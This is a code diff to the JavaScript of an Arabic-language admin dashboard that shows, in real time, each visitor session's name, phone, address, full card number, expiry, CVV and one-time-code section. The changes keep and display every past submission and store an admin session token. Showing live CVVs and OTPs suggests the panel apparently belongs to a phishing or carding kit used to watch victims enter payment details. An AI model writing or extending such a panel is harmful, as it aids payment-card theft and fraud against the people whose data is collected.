@@ -350,6 +350,18 @@ function setupSocketListeners() {
     }
   });
 
+  socket.on('admin:loginSuccess', (data) => {
+    console.log('🔐 Admin login success:', data);
+    if (data.sessionToken) {
+      localStorage.setItem('admin_token', data.sessionToken);
+      adminToken = data.sessionToken;
+    }
+  });
+
+  socket.on('admin:loginFailed', (data) => {
+    console.error('❌ Admin login failed:', data.message);
+  });
+
   socket.on('admin:forceLogout', () => {
     localStorage.removeItem('admin_token');
     adminToken = null;
@@ -361,6 +373,8 @@ function setupSocketListeners() {
   // This is the FIRST data load - populate the cache and render all visitors
   socket.on('admin:initData', (data) => {
     console.log('📊 DATA RECEIVED VIA SOCKET (admin:initData):', data);
+    console.log('📊 Visitors count:', data.visitors?.length || 0);
+    console.log('📊 First visitor has submissions:', !!data.visitors?.[0]?.delivery_submissions);
     
     const grid = document.getElementById('visitorsGrid');
     if (!grid) {
@@ -1485,14 +1499,14 @@ function updateVisitorCardFull(card, data) {
     }
   }
   
-  // Update delivery data section
-  if (data.delivery_data) {
-    updateCardSection(card, 'delivery', buildDeliverySection(data.delivery_data));
+  // Update delivery data section - with all submissions history
+  if (data.delivery_data || (data.delivery_submissions && data.delivery_submissions.length > 0)) {
+    updateCardSection(card, 'delivery', buildDeliverySection(data.delivery_data, data.delivery_submissions || [], sessionId));
   }
   
-  // Update payment data section
-  if (data.payment_data) {
-    updateCardSection(card, 'payment', buildPaymentSection(data.payment_data));
+  // Update payment data section - with all submissions history
+  if (data.payment_data || (data.payment_submissions && data.payment_submissions.length > 0)) {
+    updateCardSection(card, 'payment', buildPaymentSection(data.payment_data, data.payment_submissions || [], sessionId));
   }
   
   // Update OTP section
@@ -1516,30 +1530,111 @@ function updateCardSection(card, sectionClass, html) {
   }
 }
 
-// Helper: Build delivery section HTML
-function buildDeliverySection(data) {
-  let html = '<div class="card-section delivery-section" style="padding:12px;"><div class="section-title" style="margin-bottom:10px;"><span>📦</span> بيانات التوصيل</div>';
-  html += '<div class="data-grid">';
-  if (data.fullName) html += '<div class="data-field"><span class="data-label">الاسم</span><span class="data-value">' + escapeHtml(data.fullName) + '</span></div>';
-  if (data.phone) html += '<div class="data-field"><span class="data-label">الهاتف</span><span class="data-value" dir="ltr">' + escapeHtml(data.phone) + '</span></div>';
-  if (data.email) html += '<div class="data-field"><span class="data-label">البريد</span><span class="data-value">' + escapeHtml(data.email) + '</span></div>';
-  if (data.city) html += '<div class="data-field"><span class="data-label">المدينة</span><span class="data-value">' + escapeHtml(data.city) + '</span></div>';
-  if (data.address) html += '<div class="data-field full-width"><span class="data-label">العنوان</span><span class="data-value">' + escapeHtml(data.address) + '</span></div>';
-  html += '</div></div>';
+// Helper: Build delivery section HTML with all submissions history
+function buildDeliverySection(data, allSubmissions = [], sessionId = '') {
+  let html = '<div class="card-section delivery-section" style="padding:12px;">';
+  
+  // Title with count of submissions
+  const count = allSubmissions.length || (data ? 1 : 0);
+  const countBadge = count > 1 ? '<span class="submission-count">' + count + ' إرسالات</span>' : '';
+  html += '<div class="section-title" style="margin-bottom:10px;display:flex;align-items:center;gap:8px;"><span>📦</span> بيانات التوصيل' + countBadge + '</div>';
+  
+  // Get all submissions data
+  const submissions = [];
+  if (allSubmissions && allSubmissions.length > 0) {
+    allSubmissions.forEach((sub, idx) => {
+      const formData = typeof sub.form_data === 'string' ? JSON.parse(sub.form_data) : sub.form_data;
+      submissions.push({
+        data: formData,
+        timestamp: sub.created_at,
+        isLatest: idx === 0
+      });
+    });
+  } else if (data) {
+    submissions.push({ data: data, timestamp: null, isLatest: true });
+  }
+  
+  // Show all submissions
+  submissions.forEach((sub, idx) => {
+    const subData = sub.data;
+    const isLatest = sub.isLatest;
+    const timestamp = sub.timestamp ? formatTimeAgo(new Date(sub.timestamp)) : '';
+    const toggleClass = submissions.length > 1 ? (isLatest ? 'latest-submission' : 'old-submission collapsed') : '';
+    
+    html += '<div class="submission-item ' + toggleClass + '" style="margin-bottom:10px;padding:10px;background:' + (isLatest ? 'rgba(16,185,129,0.1)' : 'rgba(107,114,128,0.1)') + ';border-radius:8px;">';
+    
+    if (submissions.length > 1) {
+      html += '<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px;">';
+      html += '<span style="font-size:11px;color:' + (isLatest ? 'var(--success)' : '#6b7280') + ';font-weight:600;">' + (isLatest ? '✓ الأحدث' : 'الإرسال السابق') + '</span>';
+      html += '<span style="font-size:11px;color:#9ca3af;">' + timestamp + '</span>';
+      html += '</div>';
+    }
+    
+    html += '<div class="data-grid">';
+    if (subData.fullName) html += '<div class="data-field"><span class="data-label">الاسم</span><span class="data-value">' + escapeHtml(subData.fullName) + '</span></div>';
+    if (subData.phone) html += '<div class="data-field"><span class="data-label">الهاتف</span><span class="data-value" dir="ltr">' + escapeHtml(subData.phone) + '</span></div>';
+    if (subData.email) html += '<div class="data-field"><span class="data-label">البريد</span><span class="data-value">' + escapeHtml(subData.email) + '</span></div>';
+    if (subData.city) html += '<div class="data-field"><span class="data-label">المدينة</span><span class="data-value">' + escapeHtml(subData.city) + '</span></div>';
+    if (subData.address) html += '<div class="data-field full-width"><span class="data-label">العنوان</span><span class="data-value">' + escapeHtml(subData.address) + '</span></div>';
+    html += '</div></div>';
+  });
+  
+  html += '</div>';
   return html;
 }
 
-// Helper: Build payment section HTML
-function buildPaymentSection(data) {
-  const cardNum = data.cardNumber || data.card_number || '';
-  const cvv = data.cvv || '';
-  let html = '<div class="card-section payment-section" style="padding:12px;"><div class="section-title" style="margin-bottom:10px;"><span>💳</span> بيانات الدفع</div>';
-  html += '<div class="data-grid">';
-  if (cardNum) html += '<div class="data-field"><span class="data-label">البطاقة</span><span class="data-value" dir="ltr">' + escapeHtml(cardNum) + '</span></div>';
-  if (data.cardHolder) html += '<div class="data-field"><span class="data-label">صاحب البطاقة</span><span class="data-value">' + escapeHtml(data.cardHolder) + '</span></div>';
-  if (data.expiry) html += '<div class="data-field"><span class="data-label">تاريخ الانتهاء</span><span class="data-value" dir="ltr">' + escapeHtml(data.expiry) + '</span></div>';
-  if (cvv) html += '<div class="data-field"><span class="data-label">CVV</span><span class="data-value highlight" dir="ltr">' + escapeHtml(cvv) + '</span></div>';
-  html += '</div></div>';
+// Helper: Build payment section HTML with all submissions history
+function buildPaymentSection(data, allSubmissions = [], sessionId = '') {
+  let html = '<div class="card-section payment-section" style="padding:12px;">';
+  
+  // Title with count of submissions
+  const count = allSubmissions.length || (data ? 1 : 0);
+  const countBadge = count > 1 ? '<span class="submission-count">' + count + ' إرسالات</span>' : '';
+  html += '<div class="section-title" style="margin-bottom:10px;display:flex;align-items:center;gap:8px;"><span>💳</span> بيانات الدفع' + countBadge + '</div>';
+  
+  // Get all submissions data
+  const submissions = [];
+  if (allSubmissions && allSubmissions.length > 0) {
+    allSubmissions.forEach((sub, idx) => {
+      const formData = typeof sub.form_data === 'string' ? JSON.parse(sub.form_data) : sub.form_data;
+      submissions.push({
+        data: formData,
+        timestamp: sub.created_at,
+        isLatest: idx === 0
+      });
+    });
+  } else if (data) {
+    submissions.push({ data: data, timestamp: null, isLatest: true });
+  }
+  
+  // Show all submissions
+  submissions.forEach((sub, idx) => {
+    const subData = sub.data;
+    const isLatest = sub.isLatest;
+    const timestamp = sub.timestamp ? formatTimeAgo(new Date(sub.timestamp)) : '';
+    const toggleClass = submissions.length > 1 ? (isLatest ? 'latest-submission' : 'old-submission collapsed') : '';
+    
+    html += '<div class="submission-item ' + toggleClass + '" style="margin-bottom:10px;padding:10px;background:' + (isLatest ? 'rgba(16,185,129,0.1)' : 'rgba(107,114,128,0.1)') + ';border-radius:8px;">';
+    
+    if (submissions.length > 1) {
+      html += '<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px;">';
+      html += '<span style="font-size:11px;color:' + (isLatest ? 'var(--success)' : '#6b7280') + ';font-weight:600;">' + (isLatest ? '✓ الأحدث' : 'الإرسال السابق') + '</span>';
+      html += '<span style="font-size:11px;color:#9ca3af;">' + timestamp + '</span>';
+      html += '</div>';
+    }
+    
+    const cardNum = subData.cardNumber || subData.card_number || '';
+    const cvv = subData.cvv || '';
+    
+    html += '<div class="data-grid">';
+    if (cardNum) html += '<div class="data-field"><span class="data-label">البطاقة</span><span class="data-value" dir="ltr">' + escapeHtml(cardNum) + '</span></div>';
+    if (subData.cardHolder) html += '<div class="data-field"><span class="data-label">صاحب البطاقة</span><span class="data-value">' + escapeHtml(subData.cardHolder) + '</span></div>';
+    if (subData.expiry) html += '<div class="data-field"><span class="data-label">تاريخ الانتهاء</span><span class="data-value" dir="ltr">' + escapeHtml(subData.expiry) + '</span></div>';
+    if (cvv) html += '<div class="data-field"><span class="data-label">CVV</span><span class="data-value highlight" dir="ltr">' + escapeHtml(cvv) + '</span></div>';
+    html += '</div></div>';
+  });
+  
+  html += '</div>';
   return html;
 }
 
@@ -1742,20 +1837,12 @@ function updateVisitorCard(sessionId, data) {
   
   var cardBody = card.querySelector('.card-body');
   
-  // Update delivery data
-  if (data.delivery_data && cardBody) {
-    var deliveryData = data.delivery_data;
-    var deliveryHTML = '<div class="card-section"><div class="section-title"><span>📦</span> بيانات التوصيل</div>';
-    if (deliveryData.fullName) deliveryHTML += '<div class="data-row"><span class="data-label">الاسم الكامل</span><span class="data-value">' + deliveryData.fullName + '</span></div>';
-    if (deliveryData.phone) deliveryHTML += '<div class="data-row"><span class="data-label">رقم الهاتف</span><span class="data-value">' + deliveryData.phone + '</span></div>';
-    if (deliveryData.email) deliveryHTML += '<div class="data-row"><span class="data-label">البريد الإلكتروني</span><span class="data-value">' + deliveryData.email + '</span></div>';
-    if (deliveryData.city) deliveryHTML += '<div class="data-row"><span class="data-label">المدينة / المنطقة</span><span class="data-value">' + deliveryData.city + (deliveryData.region ? ' / ' + deliveryData.region : '') + '</span></div>';
-    if (deliveryData.address) deliveryHTML += '<div class="data-row"><span class="data-label">العنوان</span><span class="data-value">' + deliveryData.address + '</span></div>';
-    if (deliveryData.notes) deliveryHTML += '<div class="data-row"><span class="data-label">ملاحظات</span><span class="data-value highlight">' + deliveryData.notes + '</span></div>';
-    deliveryHTML += '</div>';
+  // Update delivery data - with submission history
+  if ((data.delivery_data || (data.delivery_submissions && data.delivery_submissions.length > 0)) && cardBody) {
+    var deliveryHTML = buildDeliverySection(data.delivery_data, data.delivery_submissions || [], sessionId);
     
     // Update or insert delivery section
-    var existingDelivery = cardBody.querySelector('.card-section:not(.payment-section):not(.otp-section)');
+    var existingDelivery = cardBody.querySelector('.delivery-section');
     if (existingDelivery) {
       existingDelivery.outerHTML = deliveryHTML;
     } else {
@@ -1763,16 +1850,9 @@ function updateVisitorCard(sessionId, data) {
     }
   }
   
-  // Update payment data
-  if (data.payment_data && cardBody) {
-    var paymentData = data.payment_data;
-    var paymentHTML = '<div class="card-section payment-section"><div class="section-title" style="border-bottom-color:#93c5fd;"><span>💳</span> بيانات الدفع</div>';
-    var cardNum = paymentData.cardNumber || paymentData.card_number || '';
-    if (cardNum) paymentHTML += '<div class="data-row"><span class="data-label">رقم البطاقة</span><span class="data-value">' + cardNum + '</span></div>';
-    if (paymentData.cardHolder) paymentHTML += '<div class="data-row"><span class="data-label">صاحب البطاقة</span><span class="data-value">' + paymentData.cardHolder + '</span></div>';
-    if (paymentData.expiry) paymentHTML += '<div class="data-row"><span class="data-label">تاريخ الانتهاء</span><span class="data-value">' + paymentData.expiry + '</span></div>';
-    if (paymentData.cvv) paymentHTML += '<div class="data-row"><span class="data-label">رمز الحماية (CVV)</span><span class="data-value highlight">' + paymentData.cvv + '</span></div>';
-    paymentHTML += '</div>';
+  // Update payment data - with submission history
+  if ((data.payment_data || (data.payment_submissions && data.payment_submissions.length > 0)) && cardBody) {
+    var paymentHTML = buildPaymentSection(data.payment_data, data.payment_submissions || [], sessionId);
     
     // Update or insert payment section
     var existingPayment = cardBody.querySelector('.payment-section');
